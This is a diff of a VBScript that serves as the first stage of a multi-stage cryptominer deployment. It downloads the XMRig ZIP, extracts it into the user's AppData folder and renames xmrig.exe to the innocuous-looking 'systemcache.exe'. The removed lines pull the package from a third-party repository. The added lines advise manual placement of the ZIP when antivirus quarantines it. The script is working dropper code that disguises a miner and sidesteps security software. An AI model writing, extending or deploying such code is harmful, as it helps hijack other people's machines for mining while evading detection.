@@ -1,183 +1,432 @@
-' ========================
-' 1_Downloader.vbs — XMRig Miner Downloader and Extractor
-' This script is designed to be downloaded and executed by 2_MinerConf.vbs.
-' Its primary function is to:
-' 1. Download the XMRig ZIP package from a specified URL.
-' 2. Extract the contents of the ZIP to the designated miner folder.
-' 3. Rename the extracted xmrig.exe to systemcache.exe.
-' 4. Log its actions to the shared miner.log file.
-' ========================
-
-Option Explicit ' Enforce explicit declaration of all variables
-
-' --- Global Object Declarations ---
-Dim shell, fso, http, binaryStream
-
-' --- Global Variable Declarations ---
-Dim downloadURL, minerFolder, outputPath, logFilePath
-
-' --- Create necessary global objects ---
-Set shell = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set http = CreateObject("MSXML2.XMLHTTP")
-Set binaryStream = CreateObject("ADODB.Stream")
+'====================================================================================
+' File: DownloadAndExtractMiner.vbs
+' Description: Downloads the XMRig ZIP and extracts it to the designated miner folder.
+'              Then immediately renames the extracted xmrig.exe to systemcache.exe.
+'              Designed as the first stage of a multi-stage deployment.
+'              Handles download failures by prompting for manual placement.
+'              IMPORTANT: All folders and files created by this script will be fully visible.
+'              Output is sent directly to the console (no pop-ups).
+'              Verification for extracted file is immediate (1-second timeout).
+'====================================================================================
 
 ' --- Configuration ---
-' URL to the XMRig ZIP file. Make sure this URL points to the raw ZIP file.
-downloadURL = "https://github.com/Mrx-coder-1157/xmrig-6.21.0/raw/main/xmrig-6.21.0.zip" ' Verify this URL and ZIP content!
-
-' Destination folder where the miner files will be extracted.
-' This should match the expected path in 2_MinerConf.vbs.
-minerFolder = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner\xmrig-6.21.0\"
-
-' The final name and path of the XMRig executable after renaming.
-outputPath = minerFolder & "systemcache.exe"
-
-' Log file path (must match the one in 2_MinerConf.vbs for consolidated logging).
-logFilePath = shell.ExpandEnvironmentStrings("%APPDATA%") & "\XMRigMiner\miner.log"
-
-' ===================================
-' Script Main Logic
-' ===================================
-
-LogToFile "Starting 1_Downloader.vbs execution..."
-
-' --- 1. Create Miner Folder ---
-' Ensure the destination folder for the miner exists.
-On Error Resume Next ' Temporarily enable OERN for folder creation
-If Not fso.FolderExists(minerFolder) Then
-    fso.CreateFolder minerFolder
-    If Err.Number = 0 Then
-        LogToFile "Created miner installation folder: " & minerFolder
-    Else
-        LogToFile "❌ Failed to create miner installation folder: " & minerFolder & ". Error: " & Err.Description
-        MsgBox "Failed to create miner installation folder: " & minerFolder & vbCrLf & Err.Description & vbCrLf & "Check logs for details.", vbCritical, "Folder Creation Error"
-        WScript.Quit ' Exit if folder cannot be created
-    End If
+Dim WshShell, fso
+On Error Resume Next ' Enable error handling for object creation
+Set WshShell = CreateObject("WScript.Shell")
+If Err.Number <> 0 Or Not IsObject(WshShell) Then
+    WScript.StdOut.WriteLine "CRITICAL ERROR: Failed to create WScript.Shell object. This may indicate a system issue or security software interference. Error: " & Err.Description
+    WScript.Quit 1
 End If
-On Error GoTo 0 ' Turn off OERN
+Err.Clear
 
-' --- 2. Download ZIP File ---
-LogToFile "📥 Downloading miner package ZIP from: " & downloadURL
-Dim zipFilePath : zipFilePath = minerFolder & "xmrig.zip"
+Set fso = CreateObject("Scripting.FileSystemObject")
+If Err.Number <> 0 Or Not IsObject(fso) Then
+    WScript.StdOut.WriteLine "CRITICAL ERROR: Failed to create Scripting.FileSystemObject object ('fso'). This is required for file operations. Error: " & Err.Description
+    WScript.Quit 1
+End If
+Err.Clear
+On Error GoTo 0 ' Disable error handling for general script flow
 
-On Error Resume Next ' Use OERN to check HTTP status gracefully
-http.Open "GET", downloadURL, False ' Synchronous download
-http.Send
-On Error GoTo 0 ' Turn off OERN
+' Miner folder in %APPDATA%
+Dim appDataPath
+appDataPath = WshShell.SpecialFolders("AppData")
+Dim minerFolder
+minerFolder = appDataPath & "\XMRigMiner" ' Fully visible folder name
 
-If http.Status = 200 Then
-    ' Save the downloaded binary data to a ZIP file.
-    binaryStream.Type = 1 ' Binary mode
-    binaryStream.Open
-    binaryStream.Write http.ResponseBody
-    binaryStream.SaveToFile zipFilePath, 2 ' 2 = Overwrite if file exists
-    binaryStream.Close
-    LogToFile "✅ Miner package ZIP downloaded to: " & zipFilePath
+' Miner details (for paths)
+Dim xmrigDownloadUrl, expectedExeSubFolderName
+xmrigDownloadUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
+' *** CRITICAL PATH FIX: This MUST match the folder name you observed inside the ZIP after extraction ***
+expectedExeSubFolderName = "xmrig-6.21.0"
 
-    ' --- 3. Extract ZIP Contents ---
-    LogToFile "📦 Initiating extraction of miner ZIP..."
-    Dim objShellApp, objFolder, objFile
-    Set objShellApp = CreateObject("Shell.Application")
-    Set objFolder = objShellApp.NameSpace(minerFolder) ' Destination for extracted files
-    Set objFile = objShellApp.NameSpace(zipFilePath)   ' Source ZIP file
+' --- NEW: Define the final desired executable name ---
+Const FINAL_MINER_EXE_NAME = "systemcache.exe" ' Changed from ssyetmcashce.exe
 
-    If Not objFolder Is Nothing And Not objFile Is Nothing Then
-        On Error Resume Next ' Handle potential errors during CopyHere
-        objFolder.CopyHere objFile.Items ' This extracts contents of the ZIP
-        If Err.Number <> 0 Then
-            LogToFile "❌ Error during ZIP extraction (CopyHere): " & Err.Description
-            MsgBox "Error during ZIP extraction: " & Err.Description & vbCrLf & "Check logs for details.", vbCritical, "Extraction Error"
-            WScript.Quit
-        End If
-        On Error GoTo 0
+' Derived paths for clarity
+Dim finalMinerExePath, minerWorkingDirectory
+Dim isFlatExtraction ' Flag to track if xmrig.exe is extracted directly or in a subfolder
 
-        ' --- Robust Waiting for Extraction Completion ---
-        ' This is crucial! Wait until the expected xmrig.exe file appears or times out.
-        Dim maxWaitSeconds, currentWait
-        maxWaitSeconds = 90 ' Max wait 90 seconds (adjust if your ZIP is very large or system slow)
-        currentWait = 0
-        ' IMPORTANT: Verify this path matches the *actual* location of xmrig.exe inside your ZIP!
-        Dim expectedExtractedPath : expectedExtractedPath = minerFolder & "xmrig-6.21.0\xmrig.exe"
+' --- Script Logic ---
+WScript.StdOut.WriteLine "--- Miner Download & Extraction Script ---"
+WScript.StdOut.WriteLine "Current time: " & Now()
 
-        LogToFile "⏱️ Waiting for extracted xmrig.exe to appear at: " & expectedExtractedPath & " (max " & maxWaitSeconds & "s)..."
-        Do While Not fso.FileExists(expectedExtractedPath) And currentWait < maxWaitSeconds
-            WScript.Sleep 1000 ' Wait 1 second
-            currentWait = currentWait + 1
-        Loop
-
-        If Not fso.FileExists(expectedExtractedPath) Then
-            LogToFile "❌ Miner extraction timed out or original xmrig.exe not found at: " & expectedExtractedPath & ". Please check ZIP contents."
-            MsgBox "Miner extraction failed or timed out. Original xmrig.exe not found after extraction. Check miner.log.", vbCritical, "Extraction Error"
-            WScript.Quit
-        Else
-            LogToFile "✅ Miner extracted successfully. Original executable found."
-        End If
-
-        ' --- 4. Move/Rename Executable ---
-        If Not fso.FileExists(outputPath) Then ' Only rename if the target file (systemcache.exe) doesn't exist
-            On Error Resume Next ' Handle error if move/rename fails
-            fso.MoveFile expectedExtractedPath, outputPath
-            If Err.Number <> 0 Then
-                LogToFile "❌ Error renaming xmrig.exe to systemcache.exe: " & Err.Description
-                MsgBox "Error renaming xmrig.exe to systemcache.exe. Check log.", vbCritical, "Rename Error"
-                WScript.Quit
-            Else
-                LogToFile "✅ Renamed xmrig.exe to systemcache.exe at: " & outputPath
-            End If
-            On Error GoTo 0
-        Else
-            LogToFile "❗ systemcache.exe already exists at " & outputPath & ", skipping rename."
-        End If
-
-        ' --- 5. Clean Up: Delete the downloaded ZIP file ---
-        If fso.FileExists(zipFilePath) Then
-            On Error Resume Next ' Handle error if deletion fails
-            fso.DeleteFile zipFilePath, True ' True = force deletion (read-only)
-            If Err.Number = 0 Then
-                LogToFile "🗑️ Deleted downloaded ZIP file: " & zipFilePath
-            Else
-                LogToFile "❌ Could not delete ZIP file: " & zipFilePath & ". Error: " & Err.Description
-            End If
-            On Error GoTo 0
-        End If
-    Else
-        LogToFile "❌ Error: Shell.Application objects (Namespace for folder or file) are nothing."
-        MsgBox "Internal error during ZIP handling. Check miner.log.", vbCritical, "Internal Error"
-        WScript.Quit
-    End If
-
+' 1. Create the main miner folder in the user's AppData directory
+WScript.StdOut.WriteLine "Target miner folder: " & minerFolder
+If Not FolderExists(minerFolder) Then
+    WScript.StdOut.WriteLine "Miner folder does not exist. Attempting to create: " & minerFolder
+    CreateFolder minerFolder
 Else
-    LogToFile "❌ Failed to download miner package ZIP. HTTP Status: " & http.Status & " - " & http.StatusText
-    MsgBox "Failed to download miner package ZIP from GitHub. HTTP Status: " & http.Status & vbCrLf & "Please verify the download URL or your internet connection.", vbCritical, "Download Error"
+    WScript.StdOut.WriteLine "Miner folder already exists: " & minerFolder
 End If
 
-' --- Script End ---
-LogToFile "🏁 1_Downloader.vbs finished execution."
+' Setup paths based on expected subfolder structure initially
+' The final path for the *renamed* executable
+finalMinerExePath = minerFolder & "\" & expectedExeSubFolderName & "\" & FINAL_MINER_EXE_NAME
+minerWorkingDirectory = minerFolder & "\" & expectedExeSubFolderName
 
-' Clean up objects (important for memory management)
-Set shell = Nothing
-Set fso = Nothing
-Set http = Nothing
-Set binaryStream = Nothing
-' This script should not quit itself unless a critical error occurs,
-' allowing 2_MinerConf.vbs to continue after it.
+' 2. Clean up old temporary extraction files and ZIP
+Dim tempExtractFolder, downloadZipPath
+tempExtractFolder = minerFolder & "\temp_xmrig_extract"
+downloadZipPath = minerFolder & "\xmrig_download.zip"
 
-' ===================================
-' Subroutine: LogToFile (Local to 1_Downloader.vbs)
-' ===================================
-' Appends a message with timestamp to the shared miner.log file.
-Sub LogToFile(msg)
-    On Error Resume Next ' Prevent script crash if logging fails
-    Dim file
-    ' Use '8' for ForAppending mode, 'True' to create the file if it doesn't exist
-    Set file = fso.OpenTextFile(logFilePath, 8, True)
-    If Err.Number = 0 Then
-        file.WriteLine Now & " - [1_Downloader] - " & msg
-        file.Close
-    Else
-        ' Fallback if logging fails (e.g., permissions issue on log file)
-        ' MsgBox "FATAL: Downloader could not write to log file! Error: " & Err.Description & vbCrLf & "Message: " & msg, vbCritical, "Logging Error"
+WScript.StdOut.WriteLine "Performing cleanup of old temp files..."
+DeleteFolder tempExtractFolder
+DeleteFile downloadZipPath
+
+' 3. Download XMRig ZIP or use pre-existing one
+If Not FileExists(finalMinerExePath) Then ' Check for the *final* named executable
+    WScript.StdOut.WriteLine "Final miner executable ('" & FINAL_MINER_EXE_NAME & "') not found. Proceeding with download and extraction."
+    WScript.StdOut.WriteLine "Attempting to download XMRig from: " & xmrigDownloadUrl & " to " & downloadZipPath
+
+    DownloadFile xmrigDownloadUrl, downloadZipPath
+    
+    If Not FileExists(downloadZipPath) Then
+        WScript.StdOut.WriteLine "ERROR: Downloaded ZIP file does not exist at expected path after download attempt." & vbCrLf & _
+                                 "This indicates a network block (firewall, proxy, security software) or Antivirus quarantine." & vbCrLf & _
+                                 "ACTION REQUIRED: Please manually download the ZIP file from " & xmrigDownloadUrl & vbCrLf & _
+                                 "and place it as " & downloadZipPath & vbCrLf & _
+                                 "Then run this script again."
+        WScript.Quit 1
     End If
+    
+    ' 4. Extract the ZIP
+    WScript.StdOut.WriteLine "Extracting XMRig from: " & downloadZipPath & " to " & tempExtractFolder
+    ' Pass expected subfolder for verification during extraction
+    ExpandZip downloadZipPath, tempExtractFolder, expectedExeSubFolderName 
+
+    ' After extraction, re-evaluate if it was a flat extraction (if xmrig.exe is directly in tempExtractFolder)
+    Dim extractedXmrigOriginalPath ' Path to xmrig.exe *after* extraction, *before* rename
+    If Not FolderExists(tempExtractFolder & "\" & expectedExeSubFolderName) And FileExists(tempExtractFolder & "\xmrig.exe") Then
+        isFlatExtraction = True
+        extractedXmrigOriginalPath = tempExtractFolder & "\xmrig.exe"
+        minerWorkingDirectory = minerFolder ' Update working directory for flat extract
+        finalMinerExePath = minerFolder & "\" & FINAL_MINER_EXE_NAME ' Update final path for flat extract
+    Else
+        isFlatExtraction = False
+        extractedXmrigOriginalPath = tempExtractFolder & "\" & expectedExeSubFolderName & "\xmrig.exe"
+    End If
+
+    ' --- DEBUGGING CHECKS START HERE ---
+    WScript.StdOut.WriteLine "--- Debugging: Post-Extraction Checks ---"
+    
+    WScript.StdOut.WriteLine "DEBUG: Immediately checking for original xmrig.exe in temp extraction path: " & extractedXmrigOriginalPath
+    If FileExists(extractedXmrigOriginalPath) Then
+        WScript.StdOut.WriteLine "DEBUG: xmrig.exe FOUND in temp extraction path. File size: " & fso.GetFile(extractedXmrigOriginalPath).Size & " bytes."
+    Else
+        WScript.StdOut.WriteLine "DEBUG: xmrig.exe NOT FOUND in temp extraction path. This is the immediate post-extraction check."
+        WScript.StdOut.WriteLine "CRITICAL ERROR: 'xmrig.exe' was not found at expected temp extraction path. Aborting."
+        WScript.Quit 1 ' Exit immediately if not found here.
+    End If
+
+    ' 5. Move extracted miner to its final location
+    WScript.StdOut.WriteLine "DEBUG: Preparing to move extracted miner to final destination folder: " & fso.GetParentFolderName(finalMinerExePath)
+    Dim sourceOfExtractedFiles
+    If Not isFlatExtraction Then
+        sourceOfExtractedFiles = tempExtractFolder & "\" & expectedExeSubFolderName
+        WScript.StdOut.WriteLine "DEBUG: Moving folder from: " & sourceOfExtractedFiles & " to " & minerWorkingDirectory
+        MoveFolder sourceOfExtractedFiles, minerWorkingDirectory
+    Else ' Flat extraction, move just the xmrig.exe
+        sourceOfExtractedFiles = tempExtractFolder & "\xmrig.exe"
+        WScript.StdOut.WriteLine "DEBUG: Copying file from: " & sourceOfExtractedFiles & " to " & minerWorkingDirectory & "\xmrig.exe" ' Copy xmrig.exe into final working dir temporarily
+    End If
+
+    ' --- NEW: Rename xmrig.exe to systemcache.exe in the final location ---
+    Dim tempXmrigInFinalPath
+    If Not isFlatExtraction Then ' If it's a subfolder extraction, xmrig.exe should now be in minerWorkingDirectory
+        tempXmrigInFinalPath = minerWorkingDirectory & "\xmrig.exe"
+    Else ' If it was a flat extraction, xmrig.exe was copied directly into minerFolder
+        tempXmrigInFinalPath = minerWorkingDirectory & "\xmrig.exe"
+    End If
+
+    WScript.StdOut.WriteLine "Attempting to rename " & tempXmrigInFinalPath & " to " & finalMinerExePath
+    If FileExists(tempXmrigInFinalPath) Then
+        If Not RenameFile(tempXmrigInFinalPath, FINAL_MINER_EXE_NAME) Then
+            WScript.StdOut.WriteLine "CRITICAL ERROR: Failed to rename '" & tempXmrigInFinalPath & "' to '" & FINAL_MINER_EXE_NAME & "'. Aborting."
+            WScript.Quit 1
+        End If
+        WScript.StdOut.WriteLine "Successfully renamed miner executable to: " & finalMinerExePath
+    Else
+        WScript.StdOut.WriteLine "CRITICAL ERROR: 'xmrig.exe' not found in final location for renaming: " & tempXmrigInFinalPath & ". Aborting."
+        WScript.Quit 1
+    End If
+    ' --- END NEW RENAME ---
+
+    WScript.StdOut.WriteLine "DEBUG: Immediately checking for " & FINAL_MINER_EXE_NAME & " in final path after rename: " & finalMinerExePath
+    If FileExists(finalMinerExePath) Then
+        WScript.StdOut.WriteLine "DEBUG: " & FINAL_MINER_EXE_NAME & " FOUND in final location. File size: " & fso.GetFile(finalMinerExePath).Size & " bytes."
+    Else
+        WScript.StdOut.WriteLine "DEBUG: " & FINAL_MINER_EXE_NAME & " NOT FOUND in final location after rename. Aborting."
+        WScript.Quit 1 ' Exit immediately if not found here.
+    End If
+    ' --- DEBUGGING CHECKS END HERE ---
+
+    WScript.StdOut.WriteLine "Cleaning up temporary extraction folder and downloaded zip..."
+    DeleteFolder tempExtractFolder
+    DeleteFile downloadZipPath
+Else
+    WScript.StdOut.WriteLine "Miner executable ('" & FINAL_MINER_EXE_NAME & "') found at: " & finalMinerExePath & ". Skipping download and extraction."
+End If
+
+' Final verification - this should now pass if the above DEBUG checks pass
+If Not FileExists(finalMinerExePath) Then
+    WScript.StdOut.WriteLine "CRITICAL ERROR: Final miner executable was not found at " & finalMinerExePath & " after all setup attempts. Aborting."
+    WScript.Quit 1
+End If
+
+WScript.StdOut.WriteLine "Miner executable successfully prepared at: " & finalMinerExePath
+WScript.StdOut.WriteLine "You can now proceed to the next stage (configuration and starting)."
+WScript.StdOut.WriteLine "--- Download & Extraction Script Finished ---"
+
+' --- Function Definitions ---
+
+Function FolderExists(folderPath)
+    On Error Resume Next
+    FolderExists = fso.FolderExists(folderPath)
+    If Err.Number <> 0 Then FolderExists = False
+    Err.Clear
+    On Error GoTo 0
+End Function
+
+Sub CreateFolder(folderPath)
+    If FolderExists(folderPath) Then Exit Sub
+
+    Dim parentFolder
+    parentFolder = fso.GetParentFolderName(folderPath)
+
+    If parentFolder <> "" And Not FolderExists(parentFolder) Then
+        CreateFolder parentFolder
+    End If
+
+    On Error Resume Next
+    fso.CreateFolder(folderPath)
+    If Err.Number <> 0 Then
+        WScript.StdOut.WriteLine "ERROR: Failed to create folder " & folderPath & ". Error: " & Err.Description
+        WScript.Quit 1
+    End If
+    Err.Clear
     On Error GoTo 0
 End Sub
+
+Function FileExists(filePath)
+    On Error Resume Next
+    FileExists = fso.FileExists(filePath)
+    If Err.Number <> 0 Then FileExists = False
+    Err.Clear
+    On Error GoTo 0
+End Function
+
+Sub DownloadFile(url, savePath)
+    On Error Resume Next
+    Dim objXMLHTTP, objStream
+    Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    If Err.Number <> 0 Or Not IsObject(objXMLHTTP) Then
+        WScript.StdOut.WriteLine "DOWNLOAD ERROR: Failed to create MSXML2.ServerXMLHTTP.6.0 object. " & Err.Description
+        WScript.Quit 1
+    End If
+    Err.Clear
+    
+    objXMLHTTP.open "GET", url, False
+    objXMLHTTP.send
+
+    If Err.Number <> 0 Then
+        WScript.StdOut.WriteLine "DOWNLOAD ERROR (VBScript COM): " & Err.Description & " (Error Number: " & Err.Number & ")"
+        WScript.Quit 1
+    End If
+
+    If objXMLHTTP.status = 200 Then
+        Set objStream = CreateObject("ADODB.Stream")
+        If Err.Number <> 0 Or Not IsObject(objStream) Then
+            WScript.StdOut.WriteLine "DOWNLOAD ERROR: Failed to create ADODB.Stream object. " & Err.Description
+            WScript.Quit 1
+        End If
+        Err.Clear
+        objStream.Type = 1
+        objStream.Open
+        objStream.Write objXMLHTTP.responseBody
+        objStream.SaveToFile savePath, 2
+        objStream.Close
+        WScript.StdOut.WriteLine "Successfully downloaded " & url & " to " & savePath
+    Else
+        WScript.StdOut.WriteLine "DOWNLOAD FAILED (HTTP Status): " & objXMLHTTP.status & " (" & objXMLHTTP.statusText & ")"
+        WScript.Quit 1
+    End If
+    Set objStream = Nothing
+    Set objXMLHTTP = Nothing
+    Err.Clear
+    On Error GoTo 0
+End Sub
+
+Sub ExpandZip(zipPath, destinationPath, expectedSubfolder)
+    If Not FolderExists(destinationPath) Then CreateFolder destinationPath
+
+    Dim objShell, objSource, objTarget
+    Set objShell = CreateObject("Shell.Application")
+    If Err.Number <> 0 Or Not IsObject(objShell) Then
+        WScript.StdOut.WriteLine "EXTRACTION ERROR: Failed to create Shell.Application object. " & Err.Description
+        WScript.Quit 1
+    End If
+    Err.Clear
+
+    If FileExists(zipPath) Then
+        Set objSource = objShell.NameSpace(zipPath)
+        If Err.Number <> 0 Or Not IsObject(objSource) Then
+            WScript.StdOut.WriteLine "EXTRACTION ERROR: Failed to access ZIP file namespace (" & zipPath & "). " & Err.Description
+            WScript.Quit 1
+        End If
+        Err.Clear
+
+        Set objTarget = objShell.NameSpace(destinationPath)
+        If Err.Number <> 0 Or Not IsObject(objTarget) Then
+            WScript.StdOut.WriteLine "EXTRACTION ERROR: Failed to access destination folder namespace (" & destinationPath & "). " & Err.Description
+            WScript.Quit 1
+            End If
+        Err.Clear
+
+        On Error Resume Next
+        objTarget.CopyHere objSource.Items, 16 ' Suppresses progress dialog
+
+        If Err.Number <> 0 Then
+            WScript.StdOut.WriteLine "EXTRACTION ERROR (CopyHere): " & Err.Description & " (Error Number: " & Err.Number & ")"
+            WScript.Quit 1
+        End If
+        Err.Clear
+        On Error GoTo 0
+
+        WScript.StdOut.WriteLine "Waiting for extraction to complete and verifying 'xmrig.exe' existence (1-second timeout)..."
+        Dim maxWaitSeconds, currentWaitTime, extractionComplete
+        maxWaitSeconds = 1 ' Reduced timeout to 1 second for faster feedback
+        currentWaitTime = 0
+        extractionComplete = False
+
+        Do While Not extractionComplete And currentWaitTime < maxWaitSeconds
+            WScript.Sleep 1000 ' Wait 1 second
+            currentWaitTime = currentWaitTime + 1
+
+            Dim localFSO ' Use a local FSO for verification
+            Set localFSO = CreateObject("Scripting.FileSystemObject")
+            If Not IsObject(localFSO) Then
+                 WScript.StdOut.WriteLine "WARNING: Could not create local FSO for extraction verification. Skipping detailed check."
+                 Exit Do
+            End If
+            
+            On Error Resume Next
+            ' Explicitly log the exact paths being checked
+            WScript.StdOut.WriteLine "DEBUG (ExpandZip Loop): Attempting to verify: " & destinationPath & "\" & expectedSubfolder & "\xmrig.exe"
+            If localFSO.FolderExists(destinationPath & "\" & expectedSubfolder) Then
+                If localFSO.FileExists(destinationPath & "\" & expectedSubfolder & "\xmrig.exe") Then
+                    extractionComplete = True
+                End If
+            ElseIf localFSO.FileExists(destinationPath & "\xmrig.exe") Then ' Fallback for flat extraction
+                WScript.StdOut.WriteLine "DEBUG (ExpandZip Loop): Also checking for flat extraction at: " & destinationPath & "\xmrig.exe"
+                extractionComplete = True
+            End If
+            Err.Clear
+            On Error GoTo 0
+            Set localFSO = Nothing
+        Loop
+
+        If Not extractionComplete Then
+            WScript.StdOut.WriteLine "EXTRACTION ERROR: 'xmrig.exe' not found after " & maxWaitSeconds & " second(s). This likely means Antivirus/security software removed it during extraction or the expected path is still incorrect."
+            WScript.Quit 1
+        End If
+        WScript.StdOut.WriteLine "ZIP file extracted successfully and verified."
+    Else
+        WScript.StdOut.WriteLine "ERROR: ZIP file not found at " & zipPath & ". Cannot extract."
+        WScript.Quit 1
+    End If
+    Set objSource = Nothing
+    Set objTarget = Nothing
+    Set objShell = Nothing
+    Err.Clear
+    On Error GoTo 0
+End Sub
+
+Sub DeleteFile(filePath)
+    On Error Resume Next
+    If FileExists(filePath) Then fso.DeleteFile(filePath)
+    Err.Clear
+    On Error GoTo 0
+End Sub
+
+Sub DeleteFolder(folderPath)
+    On Error Resume Next
+    If fso.FolderExists(folderPath) Then fso.DeleteFolder folderPath, True
+    Err.Clear
+    On Error GoTo 0
+End Sub
+
+Sub MoveFolder(sourceFolder, destinationFolder)
+    On Error Resume Next
+    If fso.FolderExists(sourceFolder) Then
+        If fso.FolderExists(destinationFolder) Then DeleteFolder destinationFolder
+        If fso.FileExists(destinationFolder) Then DeleteFile destinationFolder
+        
+        fso.MoveFolder sourceFolder, destinationFolder
+        If Err.Number <> 0 Then
+            WScript.StdOut.WriteLine "ERROR: Failed to move folder " & sourceFolder & " to " & destinationFolder & ": " & Err.Description
+            WScript.Quit 1
+        End If
+    Else
+        WScript.StdOut.WriteLine "ERROR: Source folder not found for move operation: " & sourceFolder & ". Cannot move."
+        WScript.Quit 1
+    End If
+    Err.Clear
+    On Error GoTo 0
+End Sub
+
+Sub CopyFile(sourcePath, destinationPath)
+    On Error Resume Next
+    If FileExists(sourcePath) Then
+        Dim destFolder
+        destFolder = fso.GetParentFolderName(destinationPath)
+        If Not fso.FolderExists(destFolder) Then CreateFolder destFolder
+        
+        If FileExists(destinationPath) Then DeleteFile destinationPath
+
+        fso.CopyFile sourcePath, destinationPath, True
+        If Err.Number <> 0 Then
+            WScript.StdOut.WriteLine "ERROR: Failed to copy " & sourcePath & " to " & destinationPath & ": " & Err.Description
+            WScript.Quit 1
+        End If
+    Else
+        WScript.StdOut.WriteLine "ERROR: Source file not found for copy operation: " & sourcePath & ". Cannot copy."
+        WScript.Quit 1
+    End If
+    Err.Clear
+    On Error GoTo 0
+End Sub
+
+' --- NEW: RenameFile Function ---
+Function RenameFile(oldPath, newFileName)
+    WScript.StdOut.WriteLine "LOG: Attempting to rename '" & oldPath & "' to '" & newFileName & "'"
+    On Error Resume Next
+    Dim parentFolder : parentFolder = fso.GetParentFolderName(oldPath)
+    Dim newPath : newPath = parentFolder & "\" & newFileName
+
+    If Not fso.FileExists(oldPath) Then
+        WScript.StdOut.WriteLine "ERROR: Source file for rename not found: " & oldPath
+        RenameFile = False
+        Exit Function
+    End If
+
+    If fso.FileExists(newPath) Then
+        WScript.StdOut.WriteLine "LOG: Deleting existing target file '" & newPath & "' before rename."
+        fso.DeleteFile newPath, True
+        If Err.Number <> 0 Then
+            WScript.StdOut.WriteLine "ERROR: Failed to delete existing target file for rename: " & Err.Description
+            RenameFile = False
+            Exit Function
+        End If
+    End If
+
+    fso.MoveFile oldPath, newPath
+    If Err.Number <> 0 Then
+        WScript.StdOut.WriteLine "ERROR: Failed to rename '" & oldPath & "' to '" & newPath & "'. Error: " & Err.Description
+        RenameFile = False
+    Else
+        WScript.StdOut.WriteLine "LOG: File renamed successfully to '" & newPath & "'."
+        RenameFile = True
+    End If
+    Err.Clear
+    On Error GoTo 0
+End Function
